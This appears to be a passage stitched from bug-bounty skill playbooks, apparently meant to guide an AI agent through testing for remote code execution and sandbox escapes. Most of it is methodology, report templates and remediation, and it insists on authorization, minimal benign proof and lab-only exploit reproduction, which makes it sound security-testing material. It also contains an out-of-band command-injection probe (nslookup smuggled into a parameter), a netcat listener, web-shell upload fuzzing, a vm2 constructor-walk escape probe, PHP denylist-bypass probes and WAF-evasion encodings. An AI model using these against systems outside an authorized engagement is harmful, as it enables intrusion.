## [Bugbountyskills.md] OOB hit confirmation with attribution

curl -s "https://<TARGET>/api/ping?host=example.com%3bnslookup%20<TOKEN>.<OOB_DOMAIN>"

## [Bugbountyskills.md] Callback listener during labs

nc -lvnp 9999

## [Bugbountyskills.md] Upload fuzzing

ffuf -u 'https://<TARGET>/upload' -F 'file=@polyglot.gif;filename=shell.FUZZ' -w exts.txt
```

## [Bugbountyskills.md] 6. Chain it with

- **`ssrf-testing`** — if the sink fetches a URL rather than executing a
  string, you're on the wrong ladder: webhook/import/link-preview params,
  cloud metadata reachability, and DNS rebinding live there.
- **`path-traversal-testing`** — LFI→RCE: log poisoning + include,
  session-file inclusion, `php://`/`zip://` wrapper chains, archive slip
  landing a payload that V-04/V-08 then executes.
- **`info-disclosure-testing`** — leaked `.env` files, sourcemaps revealing
  sink code, and stack traces naming framework+version tell you which variant
  and which gadget classes exist. Redact any secrets you find — report the
  leak class, don't hoard the material.
- **`sandbox-escape-testing`** — if V-02/V-05 land you in a sandboxed context
  (vm2, PyJail, Java SecurityManager, Node `vm`, WASM), the escape playbooks
  live there; do not improvise escapes against production.
- Suite neighbors: `sqli-testing` (INTO OUTFILE / xp_cmdshell RCE pivots),
  `bac-idor-testing` (reaching admin-only injection sinks), `xss-testing`
  (client-side template injection is *not* SSTI — route it there).

## [Bugbountyskills.md] Table of contents

- [V-01: OS command string injection via unsanitized input concatenation](#v-01-os-command-string-injection-via-unsanitized-input-concatenation)
- [V-02: Language-specific code argument injection via dynamic code evaluators](#v-02-language-specific-code-argument-injection-via-dynamic-code-evaluators)
- [V-03: Arbitrary object instantiation via insecure deserialization protocols](#v-03-arbitrary-object-instantiation-via-insecure-deserialization-protocols)
- [V-04: File upload and malicious web shell execution architectures](#v-04-file-upload-and-malicious-web-shell-execution-architectures)
- [V-05: SSTI RCE via template engine fingerprinting](#v-05-ssti-rce-via-template-engine-fingerprinting)

## [Bugbountyskills.md] V-04: File upload and malicious web shell execution architectures

**Mechanism:** An upload feature stores attacker content in a location the
server later executes or includes — web root under a parsing handler, a cron
spool, an include path, a converter output dir. The violated assumption is
"uploaded bytes are inert data"; execution happens when the runtime maps the
file (by extension, content sniff, or second-order include) to an interpreter.

**Preconditions:**
- An upload feature (avatar, document, import, theme/plugin, CSV/image)
- Storage path guessable/served, or later included by the app (LFI chain)
- A parsing path: Apache `AddHandler`, nginx+php-fpm `pathinfo`, IIS
  wildcard handlers, or app-side include of stored files

**Detect:** (full checklist lives in `payloads.md` §4)
1. Map the feature: accepted types, client- and server-side validation,
   storage URL pattern, image post-processing (re-encode kills appended
   payloads — verify with a baseline marker upload).
2. Baseline a valid minimal image with an embedded marker string; retrieve
   it, confirm the marker survived. This tells you whether append-style
   payloads can exist at all.
3. Run the extension matrix: `.php/.phtml/.phar/.jsp/.asp/.cgi`, double
   extensions (`shell.jpg.php`), case flips, null-byte legacy, polyglot
   (`GIF89a` header + executable body) for content-type checks.
4. Handler-remap uploads (`.htaccess`, `web.config`) and `.svg` — the latter
   is stored XSS, not RCE; route accordingly.
5. Execution proof: upload one benign marker file, GET it, observe
   interpreter output (`whoami`-class content) — then **delete it or disclose
   it; leave no shell behind** (guardrail).
6. Check second-order: does the app `include`/`readFile` stored uploads?
   If yes, this variant merges with LFI→RCE — chain `path-traversal-testing`.

**Proof of concept:**
```
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=<B>

--<B>
Content-Disposition: form-data; name="file"; filename="<PLACEHOLDER_NAME>.<EXT>"
Content-Type: image/gif

GIF89a<MARKER + payload>
--<B>--
```
Then: `GET <STORAGE_URL>` → interpreter output.

**Confirm:** Server *executes* the content (interpreter output in response,
repeatable) — not merely stores-and-serves it. If it serves your bytes as
static text, that is defacement/XSS-class, a different (lower) report.

**False positives:** SVG/HTML upload = stored XSS (route to `xss-testing`).
Uploaded file served with `Content-Type: text/plain` and no parsing = info
disclosure/defacement. Image re-compression silently stripping your payload:
"upload succeeds" ≠ "RCE". Files served from a domain that never parses them
(CDN static bucket) — no execution path, no RCE. Zip slip is
`path-traversal-testing`, not this variant.

**Impact:** Unauthenticated (or auth-scoped) RCE with full app compromise;
often the program's top payout. Phrase with the executing user and reachable
paths: "upload → execution as `<user>`, web root `<path>`".

**Remediation:** Store uploads outside the web root under random names,
serve them through a non-parsing handler with `Content-Disposition:
attachment`, re-encode images to strip payloads, and remove dangerous
extension handlers (`.htaccess` overrides, `AddHandler` wildcards).

**CWE / OWASP:** CWE-434 (Unrestricted Upload of File with Dangerous Type);
OWASP A04:2021 Insecure Design (plus A05 where handler config is the flaw).

## [Bugbountyskills.md] Table of contents

- [V-06: RCE via memory corruption and garbage collection triggers](#v-06-rce-via-memory-corruption-and-garbage-collection-triggers)
- [V-07: Command injection via argument injection in Unix wrapper utilities](#v-07-command-injection-via-argument-injection-in-unix-wrapper-utilities)
- [V-08: RCE via insecure configuration loading and variable override](#v-08-rce-via-insecure-configuration-loading-and-variable-override)
- [V-09: Blind RCE via system environment variable injections and shell expansion](#v-09-blind-rce-via-system-environment-variable-injections-and-shell-expansion)

## [Bugbountyskills.md] file=@<PLACEHOLDER_MALFORMED_FILE>    # crafted against CVE-<ID>, lab-verified

```

**Confirm:** Two signals — the crash/malformed behavior reproduces on demand
with the same input in a lab clone, **and** the vulnerable version is
positively identified (fingerprint match to the CVE). RCE claims require a
documented/working exploit chain in the lab, never a speculative "maybe
overflow" write-up.

**False positives:** Random 500s from timeouts (reproducibility filter —
send the same file twice). OOM from simply-large legitimate files (DoS by
volume ≠ memory corruption). Sandbox denials and quota errors looking like
crashes. Different worker nodes producing inconsistent behavior (pin the
node/test container before claiming).

**Impact:** Proven-in-lab: native RCE as the parser process (Critical, cite
CVE + chain evidence). Version-match-only: "vulnerable component reachable
from `<feature>`; exploitability likely per CVE-<ID>" — honest High-lead
framing. Crash: DoS of the parse worker. State which tier you achieved.

**Remediation:** Patch/upgrade the native lib, strip metadata via
re-encoding, run parsers under seccomp/nsjail in a throwaway container with
file/time/memory limits.

**CWE / OWASP:** CWE-119/CWE-122/CWE-416 (memory safety); OWASP A06:2021
Vulnerable and Outdated Components; WSTG — Testing for Buffer Overflow.

## [Bugbountyskills.md] >> sandbox-escape-testing — SKILL.md

*Source: `/root/Myskill/sandbox-escape-testing/SKILL.md`*

## [Bugbountyskills.md] Sandbox Escape Testing — Deep Playbook

Sandbox escapes are the class triage teams both love and distrust: enormous
impact claims, easy to over-state, nearly impossible to reproduce safely if
you do it sloppily. This skill makes the work methodical — identify which
confinement you are actually in, map the remaining escape surface,
fingerprint the exact runtime/library/kernel version against public
advisories, prove the boundary crossing with the lowest-impact evidence that
still holds up, and write the report. Fifteen variants span language jails
(Node/Python/PHP/Java/Ruby/Lua), infrastructure layers (Docker, Kubernetes,
Windows, Android, serverless), and memory-safety layers (V8, eBPF, WASM,
hypervisors).

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & confinement inventory.** Determine what sandbox you are actually
   in before anything else: language, exact version, and confinement
   mechanism (Node `vm`/vm2, restricted Python builtins, `disable_functions`,
   container, Java SecurityManager, Ruby `$SAFE`, k8s policy, hypervisor).
   Wrong mental model → wrong variant → wasted work, because escape surfaces
   differ completely per runtime. Use the fingerprinting ladder in
   `references/payloads.md` §1 — all probes there are benign.
2. **Surface mapping.** List what the sandboxed code *can* still reach (code
   evaluation, bytecode loading, reflection, file write, network, import
   path). An escape is one hop from a remaining primitive to a capability the
   sandbox claimed to block; you cannot find the hop without the inventory.
   Record the controls in place (allowlists, seccomp profile, admission
   policy, capability set) — they determine severity.
3. **Variant selection.** Route the observed signal through the table in §3
   and open the matching section in `references/variants-1.md` or
   `references/variants-2.md`. One signal often maps to several variants (a
   file read outside a jail could be a Python escape *or* a PHP
   `disable_functions` bypass); test the cheapest discriminators first.
4. **Version fingerprint & advisory match.** Pin the exact version from a
   package manifest, error banner, `phpversion()`, `uname -r`, UA string, or
   leaked source, then check NVD/GHSA/vendor advisories for *that* version
   and its fix. This is the core method of this skill: the exploit usually
   already exists publicly — your job is matching, not inventing.
5. **Safe probe.** Send the benign rung from `payloads.md` §2: version read,
   marker arithmetic, capability existence checks (`function_exists`,
   `kubectl auth can-i`, `type(LIST)`). No memory-corruption payloads and no
   PoCs at this stage — you are still confirming which sandbox you are in.
6. **Confirmation test.** Reproduce with a second, *independent* signal:
   version string plus behavior differential, config evidence plus benign
   marker read, RBAC result plus a host-path read in your lab. Two orthogonal
   signals are required because "sandbox reported vulnerable version" has
   plausible alternative explanations (backports, feature disabled) — this is
   the step juniors skip and the reason reports die in triage.
7. **Impact proof.** Climb the proof depth ladder in `payloads.md` §3 only to
   the lowest rung that proves the boundary was crossed — a marker file read,
   `uid`/hostname, one `id` — then stop. The report needs proof the boundary
   fell, not a demonstration of everything behind it.
8. **False-positive filter & report.** Work each variant's **False
   positives** section (document what you ruled out), then write the report
   with the template in §5. Redact anything token-like; attach the exact
   commands/requests with `<PLACEHOLDER>` slots.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| Code runs in `vm`/`runInNewContext`/vm2; stacks name `vm2` or context objects; constructor-chain walks in review | V-01 Node.js context extraction | `references/variants-1.md` |
| Python `eval`/`exec`/RestrictedPython sink; `__subclasses__`/MRO reachable; "name not defined" but object graph intact | V-02 Python scope re-alignment | `references/variants-1.md` |
| PHP target sets `disable_functions`; FFI/imap/imagick/pcntl still loaded; code sink already reached | V-03 PHP disable_functions bypass | `references/variants-1.md` |
| Inside a container: `/.dockerenv`, high `CapEff`, docker.sock mounted, `--privileged`, old `uname -r` | V-04 Docker/kernel breakout | `references/variants-1.md` |
| Java app runs a SecurityManager or plugin/script sandbox; `getSecurityManager()` non-null; reflection research applies | V-05 Java SecurityManager bypass | `references/variants-1.md` |
| Chrome/Electron/V8 build behind known in-the-wild type confusion; renderer exploit research; outdated embedded Chromium | V-06 V8 type confusion | `references/variants-1.md` |
| `uname -r` in a vulnerable kernel range *and* `unprivileged_bpf_disabled=0` or CAP_BPF present | V-07 eBPF verifier flaw | `references/variants-1.md` |
| Legacy Ruby app sets `$SAFE` around `eval`; `RUBY_VERSION` < 3.0; core-method taint bypass research | V-08 Ruby $SAFE circumvention | `references/variants-1.md` |
| Attacker supplies Lua bytecode; `load(string.dump(...))` roundtrip accepted; LuaJIT `ffi` visible | V-09 Lua bytecode/memory writes | `references/variants-2.md` |
| Pod has `hostPath` mounts (or SA can create pods); `mount` shows kubelet/host paths; no PSA restricted | V-10 Kubernetes HostPath escape | `references/variants-2.md` |
| Windows foothold with `SeImpersonatePrivilege`; RPC/135 reachable; potato-class or RPC advisory matches build | V-11 Windows RPC/token impersonation | `references/variants-2.md` |
| APK shows `exported` providers with no/enforced-weak permission; `content query` returns rows; `1=1`/`1=2` differs | V-12 Android content provider leakage | `references/variants-2.md` |
| WASM parser/decoder feature; host glue computes `ptr + len` in 32-bit math; engine version behind advisory | V-13 WASM integer overflow | `references/variants-2.md` |
| FaaS with warm instance reuse; `/tmp` writable and on the import path; marker file persists across invocations | V-14 FaaS /tmp persistence | `references/variants-2.md` |
| Guest VM shows shared folders/guest additions/hypercall surface; hypervisor fingerprint + version known | V-15 hypervisor IOCTL escape | `references/variants-2.md` |

## [Bugbountyskills.md] 4. Verification standard

A confirmed sandbox escape requires all of the following; anything less is a
lead and gets labeled as a lead:

1. **Reproducible pair.** The exact commands/requests (with `<PLACEHOLDER>`
   slots filled) and their output, produced at least twice with the same
   result — paste-ready for triage.
2. **A second, independent signal.** Two orthogonal channels: e.g. exact
   version fingerprint *and* a behavior differential (benign op that should
   be denied, succeeding); capability/config evidence *and* a benign marker
   read. One signal has alternative explanations; two do not co-occur by
   accident.
3. **Minimal-impact proof.** The lowest proof-depth rung that shows the
   boundary fell: marker file, `uid`/hostname, one `id`, or pure config
   evidence (decoded `CapEff`, `can-i` result, privilege list). Never data
   dumps, never persistence, never crashes as "proof".
4. **Version + advisory citation.** Exact version, advisory ID, and fixed
   version. In this class the fingerprint *is* evidence — but a version in a
   vulnerable range without a reachable surface (feature off, backport
   applied, sandbox not actually engaged) is a lead, not a finding.
5. **False-positive audit documented.** Name the alternative explanations
   you ruled out (sandbox never active, reflection echo, feature disabled,
   distro backport, per-invocation container) in the report's evidence.

### [Bugbountyskills.md] Title

`<Sandbox escape> via <mechanism> at <endpoint/asset> (V-XX)`

**Severity:** <Critical/High/...> — one-line justification (which boundary
fell, what sits behind it)
**Endpoint:** <`POST /api/<path>` / container `<name>` / pod `<ns/name>` /
host `<alias>` — mechanism and auth state required>
**Summary:** 2-3 sentences: the confinement mechanism, the violated trust
assumption, the proven effect.

**Steps to reproduce:**
1. <Fingerprint: command/probe → observed version/build>
2. Send/run: `<commands or request with <PLACEHOLDER> slots>`
3. Observe: <benign proof: uid/hostname/marker content/config evidence>
4. Advisory match: <CVE/GHSA-XXXX → affected <range>, fixed in <ver>>

**Impact:** What an attacker crosses (jail → process, container → host,
guest → host, warm invocation → persistent code) and the realistic worst
case. Describe blast radius; show only the minimal proof.

**Evidence:** Redacted command/output or request/response pairs, timestamps,
version strings, advisory links. No exploit source, no credentials, no
payloads beyond the benign proof.

**Remediation:** One specific fix for this boundary (patch to <ver>, run the
eval in a separate process with OS isolation, PSA restricted, drop
capability X, remove writable dirs from the import path).

**References:** CWE-<XX>; OWASP Top 10 <A0X:2021>; <advisory ID>; variant
V-XX in sandbox-escape-testing skill.
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-8 and `references/variants-2.md`
for variants 9-15; read `references/payloads.md` when you need request
templates, tool commands, or WAF-evasion encodings.

Each variant section is self-contained: mechanism, preconditions, numbered
detect steps, a proof-of-concept template with `<PLACEHOLDER>` slots, the
independent confirmation signal, false positives, impact phrasing, a
boundary-specific remediation, and the CWE/OWASP mapping. Match your observed
signal to §3, open that variant, and work top to bottom — and climb the
ladders in `payloads.md` only as far as impact proof requires.

## [Bugbountyskills.md] Payloads & Templates — Sandbox Escape Testing

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. Every template in
this file is benign by design: version reads, configuration reads, marker
arithmetic, identity prints (`id`/`whoami`/`uid`/hostname), and marker files
*you* create. Memory-corruption exploits are not shipped here — those are
public advisories you match to versions and reproduce in your own lab.

## [Bugbountyskills.md] 0. Safe-first rule

**The first signals are always read-only: a fingerprint or a capability
check. No PoCs, no memory-corruption inputs, no crashes — ever — before the
version is pinned and matched to an advisory.** Stop climbing as soon as you
have two independent signals. See §3 for exactly when to stop.

## [Bugbountyskills.md] 2. Benign probe library

Building blocks for **Detect** steps across variants — safe to send early:

- **Marker arithmetic** (evaluation proof): `7*7` → `49`; `{{7*7}}` for
  template-shaped sinks. Read-only, in-band.
- **Capability existence** (surface mapping, no effect):
  `function_exists('pcntl_exec')` (PHP), `type(ffi)` (Lua),
  `kubectl auth can-i create pods` (k8s), `ls /var/run/docker.sock`.
- **Engagement checks** (prove the gate is *on* — expected denials are
  evidence): Java `new File("/etc/passwd").exists()` → expect
  `SecurityException`; Ruby gated op → expect `SecurityError`; WASM
  `(ptr=0, len=<LARGE>)` → expect trap. Always pair with the bypass
  attempt: denied-control vs succeeded-through-bypass is the differential.
- **Reflection guards** (kill the "it just echoed my input" false positive):
  after any fingerprint-style read, compare against a host-side control in
  the same process/request. The escaped value must equal the *host's*, not
  your input's, surroundings.
- **Round-trip markers** (persistence class): unique token + timestamp per
  invocation (`/tmp/<MARKER>` in V-14). One hit is a lead; two hits are
  evidence.

## [Bugbountyskills.md] 3. Proof depth ladder

Prove the escape with the **lowest rung that shows the boundary fell**, then
stop:

- **Rung 0 — fingerprint only.** Version + surface evidence. Establishes
  *eligibility* for a finding, never the finding itself.
- **Rung 1 — config/capability evidence.** Decoded `CapEff`,
  `kubectl auth can-i` = yes, `whoami /priv` list, `disable_functions`
  content, `typeof process === 'undefined'` alongside a host-reach probe.
  Proves the precondition — zero execution.
- **Rung 2 — benign boundary-crossing proof (production ceiling).** Read a
  marker file *you* created, or print `uid`/hostname/`id`/`whoami` once.
  This is the standard for live targets: one benign command, one marker,
  then stop.
- **Rung 3 — lab-only repro.** A public PoC run against *your* version-
  matched clone/VM, proving the advisory maps to this version. Cite it as
  lab evidence; never paste exploit source into the report.

**Never:** credential dumps, other users' data, persistence/backdoors,
crash-as-proof, disk or kernel writes beyond your own lab.

**Why the lowest rung is enough for the report:** triage needs three
things, none of which require deeper exploitation — (1) a *differential*
proving the boundary crossed (denied control vs succeeded probe, context
`typeof process` vs host value, host marker vs pod marker), (2) the exact
version + advisory ID + fix version so a reviewer can verify without you
re-running anything dangerous, and (3) blast radius *described* in prose.
Minimal proof means fewer moving parts to dispute, zero collateral damage,
no scope/ToS gray zone — programs pay for the crossed boundary, not for the
body count of the evidence.

## [Bugbountyskills.md] 4. Per-ecosystem version & advisory context

Method for every variant — **check the version, then check the advisory**;
never invent the exploit:

1. Pin the exact version (§1 probes, lockfiles, banners, leaked source).
2. Search `<product> <version> sandbox escape advisory` → GHSA/NVD/vendor
   release notes.
3. Read the affected range and the **fix version**; for kernels/QEMU-class
   components, check the *distro backport*, not just the vanilla string.
4. Cite the advisory ID + fix version in the report; reproduce the public
   PoC in lab only. If no advisory matches, report the reachable surface
   with the evidence you have and say it is unvalidated — do not fabricate.

Context per ecosystem (history, not payloads):

| Ecosystem | What the history says | Where to check |
|---|---|---|
| Node vm2 | Accumulated multiple sandbox escapes (handler/Proxy/object-reach classes) through 2021-2023; project subsequently **discontinued** — any remaining use is itself a finding | GHSA/NVD for the exact version; vendor EOL notice |
| Node `vm` | Officially documented as *not* a security mechanism — "escape" of stock vm is a design-reliance finding, not a CVE hunt | Node docs; app's security claims |
| Python jails | Docs state restricted eval is not a security boundary; subclass/MRO walk research is a mature public corpus; framework bugs (RestrictedPython et al.) do get advisories | Python docs; framework GHSA; version-pinned research |
| PHP disable_functions | Per-version bypasses recur via FFI/imap/imagick/`mail`-child/LD_PRELOAD-class sinks; bypass collections and Metasploit modules track them | `phpversion()` + loaded modules → public research/Metasploit module notes |
| Java SecurityManager | Deprecated (JEP 411), removed for app use on modern JDKs; bypass literature mostly pre-JPMS — check whether the SM even exists on the deployed JDK | `java.version`; JEP notes; JDK-era research |
| Chromium/V8 | In-the-wild type-confusion era is well documented (Map-side-effect class onward); engine bugs are tracked per build | Chrome release blog, NVD, Project Zero; Electron↔Chromium mapping tables |
| eBPF verifier | 2020-2021 in-the-walk LPEs via ALU32/bounds-tracking flaws; several *more* since; distro backports decide real exposure | `uname -r` + distro changelogs; kernel CVE trackers |
| Ruby `$SAFE` | Core devs long said `$SAFE` is not a security feature; bypass research exists for 1.8/1.9-era; `$SAFE` removed in Ruby 3.0, taint in 3.2 | `RUBY_VERSION` decides whether the class even applies |
| Lua bytecode | Official docs: only load **trusted** bytecode; memory-corruption write-ups cluster on 5.1/LuaJIT; `ffi`/`debug` presence short-circuits the question | `_VERSION`/`jit.version` → public write-ups |
| Kubernetes HostPath | Mostly misconfiguration class (baseline: PSA restricted / Kyverno / OPA policies); kubelet/node CVEs are the CVE-adjacent edge | pod spec, enforce labels; kubelet release notes |
| Windows | Potato-class is a *technique* tied to privilege presence; RPC-specific issues are build/KB-specific (2021 spooler and Netlogon RPC classes are the canonical examples) | `systeminfo` build + patch level → vendor advisories |
| Android providers | Exported-provider issues are a *misconfiguration* class unless a platform CVE is involved | manifest flags + protectionLevel; MASVS/MASTG |
| WASM engines | wasmtime/wasmer/WAMR publish GHSAs for runtime bugs; the common production issue is wrapper `ptr+len` integer overflow in app code | engine version → GHSA; wrapper source review |
| FaaS /tmp reuse | Documented platform *behavior* (warm reuse, tmpfs semantics), not a CVE class — findings are misconfiguration-shaped | provider docs; your marker round-trip test |
| runc/kernel container | Recurring CVE classes (runtime binary-overwrite era, cgroup release_agent era, overlayfs/capability era) | `uname -r` + `runc --version` + distro advisories |
| Hypervisors | Guest→host issues surface periodically in VBox/QEMU/VMware device emulation; guest additions carry their own version/CVE trail | vendor advisories + distro backports; additions version |

## [Bugbountyskills.md] 5. Encoder / obfuscation & evasion notes

Use only when a WAF/filter mangles your *benign* probes; sandbox probes
often sail under WAFs tuned for XSS/SQLi until dunder patterns trigger:

| Trick | Example | Bypasses |
|---|---|---|
| Split dunder names (Python) | `'__cla' + 'ss__'`, `'__cla%s%s__' % ('','')` | WAF dunder-name rules |
| JSON unicode escapes | `"\u005f\u005fclass\u005f\u005f"` | signature scanning of raw bodies |
| Split JS properties (Node) | `this['constru' + 'ctor']` | `constructor`-pattern rules |
| PHP case mixing | `POSIX_getuid()` (function names are case-insensitive) | *string*-based denylist layers |
| Layered URL-encoding | `%25255f` for nested decoders | double/triple-decode sinks |
| Whitespace swaps | `%0a`, `%09` in expression payloads | naive space/keyword filters |
| Base64 wrapping | `echo <B64> \| base64 -d` for lab probes | content-pattern filters |

Honesty note: encodings matter only if you observe mangling — test with a
benign marker first (does `7*7` survive?) and match the encoding depth to
the decoder you actually observed. Overlong UTF-8 and null-byte tricks are
dead on modern stacks.

## [Bugbountyskills.md] container context

grep CapEff /proc/self/status && capsh --decode=<PLACEHOLDER_CAPEFF>

## [Bugbountyskills.md] k8s capability

kubectl auth can-i create pods -n <PLACEHOLDER_NAMESPACE>
kubectl get ns -o jsonpath='{.items[*].metadata.annotations.pod-security\.kubernetes\.io/enforce}'

## [Bugbountyskills.md] android statics

apkanalyzer manifest print <PLACEHOLDER_APK> | grep -A4 '<provider'

## [Bugbountyskills.md] windows

whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Build"

## [Bugbountyskills.md] eBPF surface

cat /proc/sys/kernel/unprivileged_bpf_disabled

## [Bugbountyskills.md] advisory habit (no payloads, just matching)

## [Bugbountyskills.md] search: <product> <version> sandbox escape advisory   → GHSA / NVD / vendor notes

## [Bugbountyskills.md] 7. Chain it with

- **`rce-testing`** — every sandbox escape needs a *code-execution sink
  inside the sandbox* first: `eval`/`assert` sinks, SSTI, deserialization,
  template/workflow engines, and upload-to-exec are that skill's variants.
  Land the execution there, then come here to break the confinement. SSRF
  also returns after infra escapes (reaching the scheduler API, cloud
  metadata, or internal control planes from an escaped container/host).
- **`path-traversal-testing`** — file read *in the escaped context* is the
  canonical rung-2 proof: marker-file reads, `/etc/hostname` differentials
  between guest/pod and host, and wrapper-style reads
  (`file://`, `php://`) after a jail break. LFI→jail-entry combinations
  (log poisoning delivering code into a `disable_functions`-restricted PHP,
  include-driven eval into a Python jail) live in that skill — chain
  traversal *into* the sandbox, then escape *out* of it.
- **`info-disclosure-testing`** — the version fingerprint that §4 depends on
  usually comes from there: leaked `package.json`/lockfiles, sourcemaps
  revealing the sandbox library and version, stack traces naming the runtime,
  `.git` history showing which vm2/jail framework was pinned. Report the
  leak class, redact anything secret-shaped — recon material feeds the
  advisory match, it is not the finding.

Also: escapes chain *upward* — Python/PHP/Node jail (V-01/V-02/V-03) →
container (V-04) → node/k8s (V-10) → hypervisor (V-15); stop at the first
boundary your authorization actually covers.

## [Bugbountyskills.md] >> sandbox-escape-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/sandbox-escape-testing/references/variants-1.md`*

## [Bugbountyskills.md] Sandbox Escape Variants — Part 1 (V-01 … V-08)

Deep playbook sections for the first eight variants. Work the **Detect**
steps in order: fingerprint first (benign probes only), match the exact
version to public advisories, reproduce public PoCs in *your own* lab
against a version-matched clone, and check **False positives** before writing
anything up. Payload slots are `<PLACEHOLDER>` — fill them per engagement.

## [Bugbountyskills.md] Table of contents

- [V-01: Node.js context extraction via VM/VM2 sandbox evasion control breaks](#v-01-nodejs-context-extraction-via-vmvm2-sandbox-evasion-control-breaks)
- [V-02: Python scope re-alignment via exec/eval context isolation breaks](#v-02-python-scope-re-alignment-via-execeval-context-isolation-breaks)
- [V-03: System restriction evasion via PHP disable_functions runtime bypass](#v-03-system-restriction-evasion-via-php-disable_functions-runtime-bypass)
- [V-04: Container privilege escalation via Docker daemon and kernel namespace breakouts](#v-04-container-privilege-escalation-via-docker-daemon-and-kernel-namespace-breakouts)
- [V-05: Java SecurityManager execution bypass via reflection API interception](#v-05-java-securitymanager-execution-bypass-via-reflection-api-interception)
- [V-06: Chromium V8 sandbox evasion via type confusion optimization flaws](#v-06-chromium-v8-sandbox-evasion-via-type-confusion-optimization-flaws)
- [V-07: eBPF kernel sandbox escape via verifier logic flaw invalidation](#v-07-ebpf-kernel-sandbox-escape-via-verifier-logic-flaw-invalidation)
- [V-08: Ruby $SAFE sandbox circumvention via vulnerable core method clones](#v-08-ruby-safe-sandbox-circumvention-via-vulnerable-core-method-clones)

## [Bugbountyskills.md] V-01: Node.js context extraction via VM/VM2 sandbox evasion control breaks

**Mechanism:** Attacker-influenced code runs in a `vm.createContext`/`vm2`
context that the app treats as isolated. The context shares the same heap and
prototype machinery as the host, so constructor walks
(`this.constructor.constructor('return process')()`), realm-crossing objects
(promises, error stacks, bound functions), and — in vm2's history — handler-
boundary/Proxy flaws let the sandboxed code reach the *host* realm. The
violated assumption: "a separate JS context is a security boundary." Node's
own docs say `vm` is not one; vm2 claimed to be one and accumulated multiple
sandbox escapes before being discontinued (2024).

**Preconditions:**
- Attacker code or expressions execute in `vm`/vm2 (template editor,
  serverless plugin, workflow automation, "safe eval" feature)
- Exact vm2 version matches a public advisory, *or* stock `vm` is relied on
  as a security boundary by the app's design/claims
- Host realm has useful reach (`process`, `require`) — always true for servers

**Detect:**
1. Identify the mechanism from stack traces (`runInNewContext`, `VM`), error
   names (`VMError`), leaked `package.json`/lockfiles, or the app's docs.
2. Fingerprint versions with benign probes: `process.version` and
   `process.versions.v8` from the host side; `require('vm2/package.json').version`
   in your own lab clone of the same app (never against the target).
3. Verify the sandbox is actually engaged: run `typeof process` inside the
   context — `"undefined"` proves confinement is active (if `process` is
   already visible, the sandbox is misconfigured, not escaped — different
   finding).
4. Match the pinned vm2/Node version against GHSA/NVD ("vm2 sandbox escape"
   advisories are numerous and version-specific; stock `vm` has no advisories
   because it was never a boundary).
5. Reproduce the *public* advisory PoC in your lab container against the
   version-matched install; production probing stops at steps 1–4 plus the
   benign constructor-walk probe below.

**Proof of concept:**
```

## [Bugbountyskills.md] lab harness, version-matched:

node -e "const {VM}=require('vm2'); console.log(new VM().run('<PLACEHOLDER_PROBE>'))"

benign probes:
  typeof process                                  → "undefined" (confined, expected)
  this.constructor.constructor('return process.version')()
                                                  → HOST version string = escape signal
```

**Confirm:** The constructor-walk result equals the *host* `process.version`
measured outside the sandbox in the same process (rules out reflection), and
`typeof process === 'undefined'` still holds inside — two orthogonal signals:
version differential + confinement-engaged evidence. Reproduce twice.

**False positives:** Reporting "vm escapes" against vanilla Node `vm` when
the program never claimed it was a boundary (docs say it isn't — check the
program's security claim first; without one this is usually informative, not
a vuln). The "escaped" value is your input echoed back (always diff against a
host-side control). `process` deliberately injected into the sandbox context
(misconfig, not escape). vm2 version *newer* than the advisory (backport or
fixed release — read the advisory's fixed version, not just the CVE list).

**Impact:** Arbitrary host JS execution — same blast radius as RCE in the
server process: env vars, app secrets, network pivot. Phrase as "sandbox
escape from vm2 <ver> → code execution as `<user>` in app process"; cite the
advisory instead of pasting exploit code.

**Remediation:** Treat neither `vm` nor vm2 as isolation — run untrusted code
in a separate process or container with OS-level limits (non-root user,
seccomp, cgroups, no network), or drop dynamic evaluation entirely.

**CWE / OWASP:** CWE-693 (Protection Mechanism Failure), CWE-269 (Improper
Privilege Management); OWASP A05:2021 Security Misconfiguration / A06:2021
Vulnerable and Outdated Components.

## [Bugbountyskills.md] V-03: System restriction evasion via PHP disable_functions runtime bypass

**Mechanism:** `disable_functions` deletes symbols from the runtime's
function table; it is a denylist, not a security boundary. Execution
capability is recovered through surfaces the denylist doesn't cover: `FFI`
(PHP 7.4+), `imap_open`, `Imagick`, `pcntl_*`, `mail()`/`error_log` child
processes combined with `putenv` LD_PRELOAD, CGI argv quirks, and
version-specific module sinks. The violated assumption: "listing dangerous
function names equals removing dangerous capability."

**Preconditions:**
- A PHP code-execution sink already reached (LFI→RCE, upload→exec, legacy
  `assert`/`preg_replace /e`, template eval)
- `disable_functions` set in php.ini (the constraint being claimed bypassable)
- A loaded module or alternative sink not on the list; exact PHP version

**Detect:**
1. Confirm PHP execution benignly: `echo phpversion();` — if this doesn't
   run, you don't have code execution, fix that first (route to
   `rce-testing`).
2. Read the denylist itself: `echo ini_get('disable_functions');` — benign,
   and now you know exactly what you must recover.
3. Enumerate bypass surface benignly: `extension_loaded('ffi')`,
   `ini_get('ffi.enable')`, `function_exists('imap_open')`,
   `class_exists('Imagick')`, `function_exists('pcntl_exec')`,
   `function_exists('putenv')`. Each `true` is a rung.
4. Match `phpversion()` + module set against public bypass collections and
   Metasploit-class modules — these are per-version; the correct move is
   "check the version, then check the advisory/research", not improvising.
5. Prove recovery with the *lowest* rung: a read-only function the denylist
   thought it removed (e.g. `posix_getuid()`, `getcwd()`) — uid/identity
   evidence before any shell.

**Proof of concept:**
```
POST /api/diag  (or wherever your code sink lands)
<?php
echo phpversion();                          // benign fingerprint
echo ini_get('disable_functions');          // the denylist
var_dump(extension_loaded('ffi'));          // bypass surface probes
var_dump(function_exists('imap_open'));
echo posix_getuid();                        // benign capability proof (if reachable)
?>
```

**Confirm:** Function/capability data obtained *through a path the denylist
was supposed to remove* (uid output from a blocked-family function, or FFI
reach demonstrated by a read-only call), reproducible on a second request —
plus the denylist content itself showing the function family was listed.

**False positives:** `disable_functions` is empty — then this is plain PHP
RCE (route to `rce-testing`; claiming a "bypass" of nothing gets
rejected). `function_exists` returns `true` but the call fails at
`open_basedir`/seccomp level (existence ≠ usability — attempt one benign
